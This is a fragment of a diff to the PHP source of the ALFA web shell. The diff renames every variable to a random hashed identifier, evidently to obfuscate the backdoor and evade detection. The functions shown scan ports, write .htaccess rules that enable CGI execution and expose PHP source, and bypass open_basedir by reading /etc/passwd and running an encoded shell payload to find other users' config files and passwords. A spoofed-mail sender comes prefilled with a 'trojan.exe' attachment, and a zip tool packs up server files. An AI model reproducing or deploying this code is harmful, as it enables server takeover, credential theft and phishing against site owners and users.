+echo("<tr><td><b><font color=\"#67ABDF\">Value</font></td><td>$rkptsoeg2063c1608d6e0baf80249c42e2be5804</td></tr></b>");
 echo "</table><br><br></center>";
 }
 }
@@ -5194,33 +5267,33 @@ echo '<div class=header><center><p><div class="txtfont_header">| Port Scaner |</
 <div class="txtfont">Port start: </div> <input id="text" size="5" type="text"  name="start" value="80"/>
 <div class="txtfont">Port end: </div> <input id="text" size="5" type="text" name="end" value="80"/> <input type="submit" value=" " />
 </form></center><br>';
-$start = strip_tags($_POST['alfa2']);
-$end = strip_tags($_POST['alfa3']);
-$host = strip_tags($_POST['alfa4']);
+$lshuoojwea2b2676c28c0db26d39331a336c6b92 = strip_tags($_POST['alfa2']);
+$qahbjcwq7f021a1415b86f2d013b2618fb31ae53 = strip_tags($_POST['alfa3']);
+$wlerpykf67b3dba8bc6778101892eb77249db32e = strip_tags($_POST['alfa4']);
 if(isset($_POST['alfa4']) && is_numeric($_POST['alfa3']) && is_numeric($_POST['alfa2'])){
 echo __pre();
-$packetContent = "GET / HTTP/1.1\r\n\r\n";
-if(ctype_xdigit($packetContent))$packetContent = @pack("H*" , $packetContent);
+$agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe = "GET / HTTP/1.1\r\n\r\n";
+if(ctype_xdigit($agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe))$agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe = @pack("H*" , $agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe);
 else{
-$packetContent = str_replace(array("\r","\n"), "", $packetContent);
-$packetContent = str_replace(array("\\r","\\n"), array("\r", "\n"), $packetContent);
+$agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe = str_replace(array("\r","\n"), "", $agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe);
+$agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe = str_replace(array("\\r","\\n"), array("\r", "\n"), $agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe);
 }
-for($i = $start; $i<=$end; $i++){
-$sock = @fsockopen($host, $i, $errno, $errstr, 3);
-if($sock){
-stream_set_timeout($sock, 5);
-fwrite($sock, $packetContent."\r\n\r\n\x00");
-$counter = 0;
-$maxtry = 1;
-$bin = "";
+for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = $lshuoojwea2b2676c28c0db26d39331a336c6b92; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<=$qahbjcwq7f021a1415b86f2d013b2618fb31ae53; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
+$vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5 = @fsockopen($wlerpykf67b3dba8bc6778101892eb77249db32e, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741, $irrxgcsz70106d0d821513f45702b7d25664ab7c, $ivgnqlyv809b1abe3f111fd3bb1a54c62706129f, 3);
+if($vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5){
+stream_set_timeout($vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5, 5);
+fwrite($vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5, $agdasvrv2f13fc66fdc8264f9009b9d9ed82edfe."\r\n\r\n\x00");
+$khxsaonw886bb73b3156b0aa24aac99d2de0b238 = 0;
+$ktkigkqe9624735240aafef0fa1f9fc48ca703f1 = 1;
+$dtlsqvwpc1111bd512b29e821b120b86446026b8 = "";
 do{
-$line = fgets($sock, 1024);
-if(trim($line)=="")$counter++;
-$bin .= $line;
-}while($counter<$maxtry);
-fclose($sock);
-echo "<center><p>Port <font style='color:#DE3E3E'>$i</font> is open</p>";
-echo "<p><textarea style='height:140px;width:50%;'>".$bin."</textarea></p></center>";
+$yeshcnjz6438c669e0d0de98e6929c2cc0fac474 = fgets($vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5, 1024);
+if(trim($yeshcnjz6438c669e0d0de98e6929c2cc0fac474)=="")$khxsaonw886bb73b3156b0aa24aac99d2de0b238++;
+$dtlsqvwpc1111bd512b29e821b120b86446026b8 .= $yeshcnjz6438c669e0d0de98e6929c2cc0fac474;
+}while($khxsaonw886bb73b3156b0aa24aac99d2de0b238<$ktkigkqe9624735240aafef0fa1f9fc48ca703f1);
+fclose($vtmaxjse317d37b0edc7bd7cbd25d97f53a16ce5);
+echo "<center><p>Port <font style='color:#DE3E3E'>$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741</font> is open</p>";
+echo "<p><textarea style='height:140px;width:50%;'>".$dtlsqvwpc1111bd512b29e821b120b86446026b8."</textarea></p></center>";
 }
 flush();
 }
@@ -5228,56 +5301,56 @@ flush();
 echo '</div>';
 alfafooter();
 }
-function alfacgihtaccess($m,$d='', $symname=false){
-$readme = "";
-if($symname){$readme="\nReadmeName ".trim($symname);}
-if($m=='cgi'){
-$code = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
-}elseif($m=='sym'){
-$code = "#Coded By Sole Sad & Invisible\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
-}elseif($m=='shtml'){
-$code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
+function alfacgihtaccess($cnspfppq6f8f57715090da2632453988d9a1501b,$iwxbtdws8277e0910d750195b448797616e091ad='', $wotiivfs4930ff3daf8e31b1f189819fcad77e1e=false){
+$naxoinqt3905d7917f2b3429490b01cfb60d8f5b = "";
+if($wotiivfs4930ff3daf8e31b1f189819fcad77e1e){$naxoinqt3905d7917f2b3429490b01cfb60d8f5b="\nReadmeName ".trim($wotiivfs4930ff3daf8e31b1f189819fcad77e1e);}
+if($cnspfppq6f8f57715090da2632453988d9a1501b=='cgi'){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
+}elseif($cnspfppq6f8f57715090da2632453988d9a1501b=='sym'){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = "#Coded By Sole Sad & Invisible\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$naxoinqt3905d7917f2b3429490b01cfb60d8f5b}\nOptions all";
+}elseif($cnspfppq6f8f57715090da2632453988d9a1501b=='shtml'){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = "Options +Includes\nAddTypetext/html .shtml\nAddHandler server-parsed .shtml";
 }
-@__write_file($d . ".htaccess", $code);
+@__write_file($iwxbtdws8277e0910d750195b448797616e091ad . ".htaccess", $nndigmblc13367945d5d4c91047b3b50234aa7ab);
 }
 function alfabasedir(){
 alfahead();
 echo '<div class=header>
 <center><p><div class="txtfont_header">| Open Base Dir |</div></p></center>';
-$passwd = _alfa_file('/etc/passwd');
-if(is_array($passwd)){
-$users = array();
-$makepwd = alfaMakePwd();
-$basedir = @ini_get('open_basedir');
-$safe_mode = @ini_get('safe_mode');
-if(_alfa_can_runCommand(true,false)&&($basedir||$safe_mode)){
-$bash = "fZBPSwMxEMXPzacYx9jugkvY9lbpTQ9eFU9NWdYk2wYkWZKsgmu+u9NaS8E/cwgDL/N+M+/yQjxbJ+KO3d4/rHjNusGpZL2DmEITTP/SKlOUIwOqNVTvgLxG2MB0CsGkITioz7X5P9riN60hzhHTvLYn5IoXfbAudYBXUUqHX9wPiEZDZQCj4OM807PIYovlwevHxPiHe0aWmVE7f7BaS4Ws8wEsWAe8UEOCSi+h6moQJinRtzG+6fIGtGeTp8c7Cqo4i4dAFB7xxiGakPdgSxtN6OxA/X7gePk3UtIPiddMe2dOe8wQN7NP";
-$tmp_path = alfaWriteTocgiapi("basedir.alfa",$bash);
-$bash_users  = alfaEx("cd ".$tmp_path."/alfacgiapi;sh basedir.alfa ".$makepwd,false,true,true);
-$users = json_decode($bash_users, true);
-$x=count($users);
-if($x>=2){array_pop($users);--$x;}
+$hkzphjmk76a2173be6393254e72ffa4d6df1030a = _alfa_file('/etc/passwd');
+if(is_array($hkzphjmk76a2173be6393254e72ffa4d6df1030a)){
+$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = array();
+$nddlimoycaf1642d28814084eb82983b9c9c88d6 = alfaMakePwd();
+$nvzabqlc2d5ec04ac614a2ce7db2e49fce18670c = @ini_get('open_basedir');
+$advbtcgoee5bd868ca96203f40dcfbcf40ea2a06 = @ini_get('safe_mode');
+if(_alfa_can_runCommand(true,false)&&($nvzabqlc2d5ec04ac614a2ce7db2e49fce18670c||$advbtcgoee5bd868ca96203f40dcfbcf40ea2a06)){
+$ozurlglxd574d4bb40c84861791a694a999cce69 = "fZBPSwMxEMXPzacYx9jugkvY9lbpTQ9eFU9NWdYk2wYkWZKsgmu+u9NaS8E/cwgDL/N+M+/yQjxbJ+KO3d4/rHjNusGpZL2DmEITTP/SKlOUIwOqNVTvgLxG2MB0CsGkITioz7X5P9riN60hzhHTvLYn5IoXfbAudYBXUUqHX9wPiEZDZQCj4OM807PIYovlwevHxPiHe0aWmVE7f7BaS4Ws8wEsWAe8UEOCSi+h6moQJinRtzG+6fIGtGeTp8c7Cqo4i4dAFB7xxiGakPdgSxtN6OxA/X7gePk3UtIPiddMe2dOe8wQN7NP";
+$fjvlsuooad616a4bf9c50c6d567971ff896b5f29 = alfaWriteTocgiapi("basedir.alfa",$ozurlglxd574d4bb40c84861791a694a999cce69);
+$cigfslwo150a2b14949ca7766549cf0cbba1a713  = alfaEx("cd ".$fjvlsuooad616a4bf9c50c6d567971ff896b5f29."/alfacgiapi;sh basedir.alfa ".$nddlimoycaf1642d28814084eb82983b9c9c88d6,false,true,true);
+$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = json_decode($cigfslwo150a2b14949ca7766549cf0cbba1a713, true);
+$fyyftmba9dd4e461268c8034f5c8564e155c67a6=count($qbyndzxd9bc65c2abec141778ffaa729489f3e87);
+if($fyyftmba9dd4e461268c8034f5c8564e155c67a6>=2){array_pop($qbyndzxd9bc65c2abec141778ffaa729489f3e87);--$fyyftmba9dd4e461268c8034f5c8564e155c67a6;}
 }
-if(!$basedir&&!$safe_mode){
-$x=0;
-foreach($passwd as $str){
-$pos = strpos($str,':');
-$username = substr($str,0,$pos);
-$dirz = str_replace("{user}", $username, $makepwd);
-if(($username != '')){
-if (@is_readable($dirz)){
-array_push($users,$username);
-$x++;
+if(!$nvzabqlc2d5ec04ac614a2ce7db2e49fce18670c&&!$advbtcgoee5bd868ca96203f40dcfbcf40ea2a06){
+$fyyftmba9dd4e461268c8034f5c8564e155c67a6=0;
+foreach($hkzphjmk76a2173be6393254e72ffa4d6df1030a as $okjeiabf341be97d9aff90c9978347f66f945b77){
+$szfjzexy5e0bdcbddccca4d66d74ba8c1cee1a68 = strpos($okjeiabf341be97d9aff90c9978347f66f945b77,':');
+$rgusbycx14c4b06b824ec593239362517f538b29 = substr($okjeiabf341be97d9aff90c9978347f66f945b77,0,$szfjzexy5e0bdcbddccca4d66d74ba8c1cee1a68);
+$jexdzxtb89332de31569e1e3761758f8873be4ff = str_replace("{user}", $rgusbycx14c4b06b824ec593239362517f538b29, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
+if(($rgusbycx14c4b06b824ec593239362517f538b29 != '')){
+if (@is_readable($jexdzxtb89332de31569e1e3761758f8873be4ff)){
+array_push($qbyndzxd9bc65c2abec141778ffaa729489f3e87,$rgusbycx14c4b06b824ec593239362517f538b29);
+$fyyftmba9dd4e461268c8034f5c8564e155c67a6++;
 }}}
 }
 echo '<br><br>';
-echo "<b><font color=\"#00A220\">[+] Founded ".sizeof($passwd)." entrys in /etc/passwd\n"."<br /></font></b>";
-echo "<b><font color=\"#FFFFFF\">[+] Founded ".$x." readable ".str_replace("{user}", "*", $makepwd)." directories\n"."<br /></font></b>";
+echo "<b><font color=\"#00A220\">[+] Founded ".sizeof($hkzphjmk76a2173be6393254e72ffa4d6df1030a)." entrys in /etc/passwd\n"."<br /></font></b>";
+echo "<b><font color=\"#FFFFFF\">[+] Founded ".$fyyftmba9dd4e461268c8034f5c8564e155c67a6." readable ".str_replace("{user}", "*", $nddlimoycaf1642d28814084eb82983b9c9c88d6)." directories\n"."<br /></font></b>";
 echo "<b><font color=\"#FF0000\">[~] Searching for passwords in config files...\n\n"."<br /><br /><br /></font></b>";
-foreach($users as $user){
-if(empty($user))continue;
-$path = str_replace("{user}", $user, $makepwd);
-echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#27979B>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
+foreach($qbyndzxd9bc65c2abec141778ffaa729489f3e87 as $eeodyzriee11cbb19052e40b07aac0ca060c23ee){
+if(empty($eeodyzriee11cbb19052e40b07aac0ca060c23ee))continue;
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = str_replace("{user}", $eeodyzriee11cbb19052e40b07aac0ca060c23ee, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
+echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#27979B>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$eeodyzriee11cbb19052e40b07aac0ca060c23ee</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485'><input type=submit value='>>'></form><br>";
 }
 }else{echo('<b> <center><font color="#FFFFFF">[-] Error : coudn`t read /etc/passwd [-]</font></center></b>');}
 echo '<br><br></b>';
@@ -5289,57 +5362,57 @@ alfahead();
 echo '<div class=header>';
 AlfaNum(8,9,10);
 echo '<center><p><div class="txtfont_header">| Fake Mail |</div></p><form action="" method="post" onsubmit="g(\'mail\',null,this.mail_to.value,this.mail_from.value,this.mail_subject.value,\'>>\',this.mail_content.value,this.count_mail.value,this.mail_attach.value); return false;">';
-$table = array(
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array(
 'td1' => array('color' => 'FFFFFF', 'tdName' => 'Mail To : ', 'inputName' => 'mail_to', 'inputValue' => 'target@fbi.gov', 'inputSize' => '60','placeholder' => true),
 'td2' => array('color' => 'FFFFFF', 'tdName' => 'From : ', 'inputName' => 'mail_from', 'inputValue' => 'sec@google.com', 'inputSize' => '60', 'placeholder' => true),
 'td3' => array('color' => 'FFFFFF', 'tdName' => 'Subject : ', 'inputName' => 'mail_subject', 'inputValue' => 'your site hacked by me', 'inputSize' => '60'),
 'td4' => array('color' => 'FFFFFF', 'tdName' => 'Attach File : ', 'inputName' => 'mail_attach', 'inputValue' => $GLOBALS['cwd'].'trojan.exe', 'inputSize' => '60'),
 'td5' => array('color' => 'FFFFFF', 'tdName' => 'Count Mail : ', 'inputName' => 'count_mail', 'inputValue' => '1', 'inputSize' => '60')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo '<p><div class="txtfont">Message:</div></p><textarea rows="6" cols="60" name="mail_content">Hi Dear Admin :)</textarea><p><input type="submit" value=" " name="mail_send" /></p></form></center>';
 if(isset($_POST['alfa4'])&&($_POST['alfa4'] == '>>')){
-$mail_to = $_POST['alfa1'];
-$mail_from = $_POST['alfa2'];
-$mail_subject = $_POST['alfa3'];
-$mail_content = $_POST['alfa5'];
-$count_mail = (int)$_POST['alfa6'];
-$mail_attach = $_POST['alfa7'];
-if(filter_var($mail_to, FILTER_VALIDATE_EMAIL)){
-if(!empty($mail_attach)&&@is_file($mail_attach)){
-$file = $mail_attach;
-$content = __read_file($file);
-$content = chunk_split(__ZW5jb2Rlcg($content));
-$uid = md5(uniqid(time()));
-$filename = basename($file);
-$headers  = "From: ".$mail_from." <".$mail_from.">\r\n";
-$headers .= "To: " . $mail_to. " ( ".$mail_to." ) \r\n";
-$headers .= "Reply-To: ".$mail_from."\r\n";
-$headers .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";
-$headers .= 'MIME-Version: 1.0' . "\r\n";
-$headers .= 'X-Mailer: php' . "\r\n";
-$mail_content  = "--".$uid."\r\n";
-$mail_content .= "Content-type:text/plain; charset=iso-8859-1\r\n";
-$mail_content .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
-$mail_content .= $mail_content."\r\n\r\n";
-$mail_content .= "--".$uid."\r\n";
-$mail_content .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n";
-$mail_content .= "Content-Transfer-Encoding: base64\r\n";
-$mail_content .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n";
-$mail_content .= $content."\r\n\r\n";
-$mail_content .= "--".$uid."--";
+$gkcdrdwb7761328925cbb8a97e25d8cdf436687e = $_POST['alfa1'];
+$dhbbltms9e35acb7edddb1772b2efd7d781ddcff = $_POST['alfa2'];
+$cxhbzttfc7191005a7fff846844afd4be9509e77 = $_POST['alfa3'];
+$gjfgehcpe7ade27667e6c2f068e2491ecab3190c = $_POST['alfa5'];
+$zisjfpfj8f1240cce71bfde983efe8971d4a85d4 = (int)$_POST['alfa6'];
+$mvufrnyvb09dcba661a9be84b1d59e8a113cae92 = $_POST['alfa7'];
+if(filter_var($gkcdrdwb7761328925cbb8a97e25d8cdf436687e, FILTER_VALIDATE_EMAIL)){
+if(!empty($mvufrnyvb09dcba661a9be84b1d59e8a113cae92)&&@is_file($mvufrnyvb09dcba661a9be84b1d59e8a113cae92)){
+$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $mvufrnyvb09dcba661a9be84b1d59e8a113cae92;
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 = __read_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 = chunk_split(__ZW5jb2Rlcg($mveevork9a0364b9e99bb480dd25e1f0284c8555));
+$uwdmfmmt9871d3a2c554b27151cacf1422eec048 = md5(uniqid(time()));
+$ydojshxa435ed7e9f07f740abf511a62c00eef6e = basename($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4  = "From: ".$dhbbltms9e35acb7edddb1772b2efd7d781ddcff." <".$dhbbltms9e35acb7edddb1772b2efd7d781ddcff.">\r\n";
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= "To: " . $gkcdrdwb7761328925cbb8a97e25d8cdf436687e. " ( ".$gkcdrdwb7761328925cbb8a97e25d8cdf436687e." ) \r\n";
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= "Reply-To: ".$dhbbltms9e35acb7edddb1772b2efd7d781ddcff."\r\n";
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= "Content-Type: multipart/mixed; boundary=\"".$uwdmfmmt9871d3a2c554b27151cacf1422eec048."\"\r\n\r\n";
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'MIME-Version: 1.0' . "\r\n";
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'X-Mailer: php' . "\r\n";
+$gjfgehcpe7ade27667e6c2f068e2491ecab3190c  = "--".$uwdmfmmt9871d3a2c554b27151cacf1422eec048."\r\n";
+$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "Content-type:text/plain; charset=iso-8859-1\r\n";
+$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
+$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= $gjfgehcpe7ade27667e6c2f068e2491ecab3190c."\r\n\r\n";
+$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "--".$uwdmfmmt9871d3a2c554b27151cacf1422eec048."\r\n";
+$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "Content-Type: application/octet-stream; name=\"".$ydojshxa435ed7e9f07f740abf511a62c00eef6e."\"\r\n";
+$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "Content-Transfer-Encoding: base64\r\n";
+$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "Content-Disposition: attachment; filename=\"".$ydojshxa435ed7e9f07f740abf511a62c00eef6e."\"\r\n\r\n";
+$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= $mveevork9a0364b9e99bb480dd25e1f0284c8555."\r\n\r\n";
+$gjfgehcpe7ade27667e6c2f068e2491ecab3190c .= "--".$uwdmfmmt9871d3a2c554b27151cacf1422eec048."--";
 }else{
-$headers  = "From: " . $mail_from. " ( ".$mail_from." ) \r\n";
-$headers .= "To: " . $mail_to. " ( ".$mail_to." ) \r\n";
-$headers .= 'Reply-To: '.$mail_from.'' . "\r\n";
-$headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
-$headers .= 'MIME-Version: 1.0' . "\r\n";
-$headers .= 'X-Mailer: php' . "\r\n";
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4  = "From: " . $dhbbltms9e35acb7edddb1772b2efd7d781ddcff. " ( ".$dhbbltms9e35acb7edddb1772b2efd7d781ddcff." ) \r\n";
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= "To: " . $gkcdrdwb7761328925cbb8a97e25d8cdf436687e. " ( ".$gkcdrdwb7761328925cbb8a97e25d8cdf436687e." ) \r\n";
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'Reply-To: '.$dhbbltms9e35acb7edddb1772b2efd7d781ddcff.'' . "\r\n";
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'Content-type: text/html; charset=utf-8' . "\r\n";
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'MIME-Version: 1.0' . "\r\n";
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 .= 'X-Mailer: php' . "\r\n";
 }
-if(empty($count_mail)||$count_mail<1)$count_mail=1;
-if(!empty($mail_from)){echo __pre();
-for($i=1;$i<=$count_mail;$i++){
-if(@mail($mail_to,$mail_subject,$mail_content,$headers))echo("<center>Sent -> $mail_to<br></center>");
+if(empty($zisjfpfj8f1240cce71bfde983efe8971d4a85d4)||$zisjfpfj8f1240cce71bfde983efe8971d4a85d4<1)$zisjfpfj8f1240cce71bfde983efe8971d4a85d4=1;
+if(!empty($dhbbltms9e35acb7edddb1772b2efd7d781ddcff)){echo __pre();
+for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<=$zisjfpfj8f1240cce71bfde983efe8971d4a85d4;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
+if(@mail($gkcdrdwb7761328925cbb8a97e25d8cdf436687e,$cxhbzttfc7191005a7fff846844afd4be9509e77,$gjfgehcpe7ade27667e6c2f068e2491ecab3190c,$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4))echo("<center>Sent -> $gkcdrdwb7761328925cbb8a97e25d8cdf436687e<br></center>");
 }}else{__alert("Invalid Mail From !");}
 }else{__alert("Invalid Mail To !");}
 }
@@ -5356,48 +5429,48 @@ echo '<div class=header><p><center><p><div class="txtfont_header">| Compressor |
 <input type="submit" value=" " name="ziper" />
 </form></center></p>';
 if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
-$dirzip = $_POST['alfa3'];
-$zipfile = $_POST['alfa4'];
+$jfeaqldt1c837a6660014f0d862c65f9808fa839 = $_POST['alfa3'];
+$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6 = $_POST['alfa4'];
 if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
-alfaEx("powershell Compress-Archive -Path '".addslashes($dirzip)."' -DestinationPath '".addslashes(basename($zipfile))."'");
-echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
+alfaEx("powershell Compress-Archive -Path '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."' -DestinationPath '".addslashes(basename($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6))."'");
+echo __pre().'<center><p>Done -> <b><font color="green">'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font></b></p></center>';
 }elseif($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
-alfaEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."'");
-echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
+alfaEx("cd '".addslashes(dirname($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6))."';zip -r '".addslashes(basename($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6))."' '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."'");
+echo __pre().'<center><p>Done -> <b><font color="green">'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font></b></p></center>';
 }elseif(class_exists('ZipArchive')){
-if(__alfaziper($dirzip, $zipfile)){
-echo __pre().'<center><p><font color="green">Success...!<br>'.$zipfile.'</font></p></center>';
+if(__alfaziper($jfeaqldt1c837a6660014f0d862c65f9808fa839, $csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6)){
+echo __pre().'<center><p><font color="green">Success...!<br>'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font></p></center>';
 }else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
 }
 }
 echo '</div>';
 alfafooter();
 }
-function __alfaziper($source,$destination){
-	if(!extension_loaded('zip')||!file_exists($source)){
+function __alfaziper($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb,$ioqwmeeq6990a54322d9232390a784c5c9247dd6){
+	if(!extension_loaded('zip')||!file_exists($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb)){
 		return false;
 	}
-	$zip=new ZipArchive();
-	if(!$zip->open($destination,ZIPARCHIVE::CREATE)){
+	$zessjrwjadcdbd79a8d84175c229b192aadc02f2=new ZipArchive();
+	if(!$zessjrwjadcdbd79a8d84175c229b192aadc02f2->open($ioqwmeeq6990a54322d9232390a784c5c9247dd6,ZIPARCHIVE::CREATE)){
 		return false;
 	}
-	$source=str_replace('\\','/',realpath($source));
-	if(is_dir($source)===true){
-		$files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source),RecursiveIteratorIterator::SELF_FIRST);
-		foreach($files as $file){
-			$file=str_replace('\\','/',$file);
-			if(in_array(substr($file,strrpos($file,'/')+1),array('.','..')))continue;
-			$file=realpath($file);
-			if(is_dir($file)===true){
-				$zip->addEmptyDir(str_replace($source.'/','',$file.'/'));
-			}else if(is_file($file)===true){
-				$zip->addFromString(str_replace($source.'/','',$file),file_get_contents($file));
+	$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb=str_replace('\\','/',realpath($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb));
+	if(is_dir($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb)===true){
+		$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb),RecursiveIteratorIterator::SELF_FIRST);
+		foreach($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
+			$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=str_replace('\\','/',$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
+			if(in_array(substr($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,strrpos($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,'/')+1),array('.','..')))continue;
+			$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=realpath($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
+			if(is_dir($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)===true){
+				$zessjrwjadcdbd79a8d84175c229b192aadc02f2->addEmptyDir(str_replace($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb.'/','',$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac.'/'));
+			}else if(is_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)===true){
+				$zessjrwjadcdbd79a8d84175c229b192aadc02f2->addFromString(str_replace($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb.'/','',$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac),file_get_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac));
 			}
 		}
-	}else if(is_file($source)===true){
-		$zip->addFromString(basename($source),file_get_contents($source));
+	}else if(is_file($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb)===true){
+		$zessjrwjadcdbd79a8d84175c229b192aadc02f2->addFromString(basename($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb),file_get_contents($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb));
 	}
-	return $zip->close();
+	return $zessjrwjadcdbd79a8d84175c229b192aadc02f2->close();
 }
 function alfadeziper(){
 alfahead();
@@ -5409,81 +5482,81 @@ echo '<div class=header><p><center><p><div class="txtfont_header">| DeCompressor
 <input type="submit" value=" " name="ziper" />
 </form></center></p>';
 if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
-$dirzip = $_POST['alfa3'];
-$zipfile = $_POST['alfa4'];
-if(@!is_dir($zipfile)){
-	@mkdir($zipfile, 0777, true);
